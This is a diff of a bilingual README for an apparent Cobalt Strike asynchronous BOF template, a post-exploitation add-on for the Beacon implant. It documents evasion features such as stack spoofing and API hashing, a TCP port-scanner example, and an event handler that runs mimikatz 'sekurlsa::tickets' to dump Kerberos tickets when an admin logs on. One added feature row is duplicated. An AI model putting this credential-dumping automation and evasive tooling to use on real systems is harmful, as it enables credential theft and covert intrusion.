@@ -46,6 +46,8 @@ Async BOF 允许 BOF 作为后台监控任务运行，同时 Beacon 处于 sleep
 | **Event wakeup** | Async BOF can wake Beacon immediately on events | **事件唤醒** | Async BOF 可在检测到事件时立即唤醒 Beacon |
 | **Graceful shutdown** | BOF can detect stop signals from operator | **优雅关闭** | BOF 可检测操作员发送的停止信号 |
 | **Sleepmask compatible** | IAT patching for calling Beacon APIs while sleepmasked | **Sleepmask 兼容** | 支持在 Beacon 加密状态下调用 Beacon API |
+| **Blog-aligned API** | Uses `BeaconWakeup()`/`BeaconGetStopJobEvent()` as per Outflank blog | **博客对齐 API** | 使用 Outflank 博客中定义的 `BeaconWakeup()`/`BeaconGetStopJobEvent()` |
+| **OPSEC enhanced** | Thread pool, stack spoofing, API hashing | **OPSEC 增强** | 线程池执行、栈欺骗、API 哈希化 |
 | **OPSEC enhanced** | Thread pool, stack spoofing, API hashing | **OPSEC 增强** | 线程池执行、栈欺骗、API 哈希化 |
 
 ---
@@ -76,13 +78,13 @@ Async BOF 允许 BOF 作为后台监控任务运行，同时 Beacon 处于 sleep
 
 4. Upload the `.x64.o` file to your teamserver / 上传 `.x64.o` 文件到 teamserver
 
-### Basic Usage / 基本用法
+### Basic Usage (Blog-Aligned API) / 基本用法（博客对齐 API）
 
 ```cpp
 #include "async/async_bof.h"
 
 void go(char* args, int len) {
-    // Initialize with stop event handle / 使用 stop event handle 初始化
+    // Initialize with stop event handle from CNA loader
     async_init(args, len);
 
     if (!async_is_initialized()) {
@@ -90,15 +92,17 @@ void go(char* args, int len) {
         return;
     }
 
-    HANDLE hStop = async_get_stop_event();
+    // Get the stop event handle (Outflank blog API)
+    HANDLE hStop = BeaconGetStopJobEvent();
 
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Async BOF started");
 
-    // Main monitoring loop / 主监控循环
-    while (!async_should_stop(1000)) {
-        // Check for target event / 检查目标事件
+    // Main monitoring loop — use the stop event directly
+    while (WaitForSingleObject(hStop, 1000) == WAIT_TIMEOUT) {
+        // Check for target event
 
         if (event_detected) {
+            // Print alert and wake Beacon immediately
             ASYNC_ALERT("[!] Important event detected!");
         }
     }
@@ -132,9 +136,9 @@ beacon> async_stop_all
 | Function | Description | 函数 | 说明 |
 |----------|-------------|------|------|
 | `async_init(args, len)` | Initialize, parse stop event from args | `async_init(args, len)` | 初始化，从 args 解析 stop event |
-| `async_get_stop_event()` | Get stop event handle | `async_get_stop_event()` | 获取 stop event 句柄 |
-| `async_should_stop(ms)` | Check if stop signal received | `async_should_stop(ms)` | 检查是否收到停止信号 |
-| `async_wakeup()` | Signal Beacon to wake up | `async_wakeup()` | 发送唤醒信号给 Beacon |
+| `BeaconGetStopJobEvent()` | Get stop event handle (blog API) | `BeaconGetStopJobEvent()` | 获取 stop event 句柄（博客 API）|
+| `async_should_stop(ms)` | Check if stop signal received (wraps WaitForSingleObject) | `async_should_stop(ms)` | 检查是否收到停止信号 |
+| `BeaconWakeup()` | Signal Beacon to wake up (blog API) | `BeaconWakeup()` | 发送唤醒信号给 Beacon（博客 API）|
 | `async_printf(type, fmt, ...)` | Print output to console | `async_printf(type, fmt, ...)` | 输出到 Beacon 控制台 |
 | `async_stopping()` | Send STOPPING notification | `async_stopping()` | 发送 STOPPING 通知 |
 | `async_stopped()` | Send STOPPED notification | `async_stopped()` | 发送 STOPPED 通知 |
@@ -205,6 +209,41 @@ beacon> async_bof async_monitor_process.x64.o notepad.exe 2000
 [!] PROCESS START: notepad.exe (PID: 1234)
 ```
 
+### async_portscan.c
+
+TCP port scanner using non-blocking sockets. Wakes Beacon on each open port discovery.
+
+使用非阻塞 Socket 的 TCP 端口扫描器。每次发现开放端口时唤醒 Beacon。
+
+```cpp
+// Scan first 1024 ports on 192.168.1.1 with 500ms timeout
+beacon> async_bof async_portscan.x64.o 192.168.1.1 1 1024 500
+
+// Output / 输出
+[!] OPEN PORT: 192.168.1.1:22
+[!] OPEN PORT: 192.168.1.1:80
+[!] OPEN PORT: 192.168.1.1:443
+[*] Progress: 100/1024 ports scanned (3 open)
+[*] Scan complete: 3/1024 ports open on 192.168.1.1
+```
+
+---
+
+## CNA Event Automation / CNA 事件自动化
+
+The aggressor script supports registering event handlers that trigger on `DATA` protocol messages:
+
+Aggressor 脚本支持注册事件处理函数，在收到 `DATA` 协议消息时触发：
+
+```cpp
+// Register an automated handler on the operator console
+beacon> async_on_event ADMIN_LOGON { blogin($bid, 'sekurlsa::tickets'); } 'Dump tickets on admin logon'
+```
+
+Handlers run on the teamserver when the async BOF sends a `DATA` message. This enables automated responses without polling.
+
+处理函数在 teamserver 端运行（当 async BOF 发送 `DATA` 消息时触发），无需轮询即可实现自动化响应。
+
 ---
 
 ## Mock Testing / Mock 测试
@@ -269,6 +308,41 @@ Standard BOF (crashes during sleepmask) / 标准 BOF（sleepmask 时崩溃）:
 Patched BOF (safe) / 已修补 BOF（安全）:
   BeaconPrintf@IAT → AsyncBOF_ProxyPrintf (unencrypted stub/非加密存根)
 ```
+
+### Proxy Architecture / 代理架构
+
+Proxy functions live in `async/async_bof_proxy.cpp`. To prevent infinite recursion (proxy calling patched `BeaconPrintf` which calls proxy again), the patch code **saves original function addresses** before overwriting the IAT:
+
+代理函数位于 `async/async_bof_proxy.cpp`。为防止无限递归（代理调用已被修补的 `BeaconPrintf`，后者再次调用代理），补丁代码在覆盖 IAT 之前**保存原始函数地址**：
+
+```
+Before patch / 修补前:
+  beacon$BeaconPrintf → Real BeaconPrintf (in beacon.dll)
+
+Patch step 1: Save original / 补丁步骤 1：保存原始地址
+  async_bof_save_original("BeaconPrintf", RealBeaconPrintfAddr)
+
+Patch step 2: Redirect / 补丁步骤 2：重定向
+  beacon$BeaconPrintf → proxy_BeaconPrintf
+
+At runtime / 运行时:
+  BOF code → proxy_BeaconPrintf (wraps in ASYNCPROTO)
+           → saved original RealBeaconPrintf (no recursion / 无递归)
+```
+
+### Saved Originals Table / 已保存原始函数表
+
+| Proxy Function | Saved Original | 代理函数 | 保存的原始函数 |
+|---------------|----------------|-----------|----------------|
+| `proxy_BeaconPrintf` | `g_orig_BeaconPrintf` | `proxy_BeaconPrintf` | `g_orig_BeaconPrintf` |
+| `proxy_BeaconOutput` | `g_orig_BeaconOutput` | `proxy_BeaconOutput` | `g_orig_BeaconOutput` |
+| `proxy_BeaconWakeup` | (calls `async_wakeup` directly) | `proxy_BeaconWakeup` | (直接调用 `async_wakeup`) |
+| `proxy_BeaconGetStopJobEvent` | (calls `async_get_stop_event` directly) | `proxy_BeaconGetStopJobEvent` | (直接调用 `async_get_stop_event`) |
+| `proxy_BeaconDataParse/Int/Short/Length/Extract` | `g_orig_BeaconData*` | `proxy_BeaconData*` | `g_orig_BeaconData*` |
+
+The proxy functions `async_bof_proxy.cpp` is **not compiled as a standalone COFF** to avoid self-patching recursion. It is linked only into the debug EXE for testing.
+
+`async_bof_proxy.cpp` **不会编译为独立 COFF**，以避免自修补递归。它仅链接到调试 EXE 用于测试。
 
 ### COFF Patching API / COFF 修补 API
 
@@ -369,24 +443,30 @@ python ./utils/boflint.py --loader cs x64/Release/bof.x64.o
 ```
 BOF-Template/
 ├── async/
-│   ├── async_bof.h           # Async BOF API / Async BOF API
-│   ├── async_bof.c           # Core implementation / 核心实现
-│   ├── async_bof_patch.h    # IAT patching interface / IAT 修补接口
-│   ├── async_bof_patch.c    # COFF patching / COFF 修补
-│   ├── async_protocol.h     # Protocol constants / 协议常量
-│   └── async_protocol.c      # Message encoding / 消息编码
+│   ├── async_bof.h            # Async BOF API (BeaconWakeup/BeaconGetStopJobEvent wrappers)
+│   ├── async_bof.c            # Core implementation / 核心实现
+│   ├── async_bof_patch.h      # IAT patching interface / IAT 修补接口
+│   ├── async_bof_patch.c      # COFF patching + save-original logic / COFF 修补 + 保存原始地址
+│   ├── async_bof_proxy.cpp    # Proxy functions with saved-original trampolines
+│   ├── async_protocol.h       # Protocol constants / 协议常量
+│   └── async_protocol.c       # Message encoding / 消息编码
 ├── base/
-│   ├── helpers.h             # DFR macros
-│   ├── mock.h / mock.cpp    # Beacon API mock
-│   └── mock_async.h / mock_async.cpp  # Async mock
+│   ├── helpers.h              # DFR macros
+│   ├── mock.h / mock.cpp     # Beacon API mock (all 50+ APIs)
+│   ├── mock_syscalls.cpp     # Syscall mock infrastructure
+│   └── mock_async.h / mock_async.cpp  # Async mock framework
 ├── cna/
-│   └── async_bof.cna         # Aggressor Script loader
+│   └── async_bof.cna          # Aggressor Script (job lifecycle, event automation)
 ├── examples/
-│   ├── async_monitor_logon.c   # Logon monitor / 登录监控
-│   └── async_monitor_process.c # Process monitor / 进程监控
+│   ├── async_monitor_logon.c    # Logon monitor / 登录监控
+│   ├── async_monitor_process.c  # Process monitor / 进程监控
+│   └── async_portscan.c         # TCP port scanner / TCP 端口扫描器
 ├── utils/
-│   └── boflint.py            # BOF static analyzer / BOF 静态分析器
-└── BOF-Template.vcxproj      # Visual Studio project
+│   └── boflint.py             # BOF static analyzer / BOF 静态分析器
+├── .github/workflows/
+│   └── build.yml              # GitHub Actions CI (windows-2022, MSVC x64/Win32)
+├── Makefile                   # NMake build (COFF + EXE debug)
+└── BOF-Template.vcxproj       # Visual Studio project
 ```
 
 ---
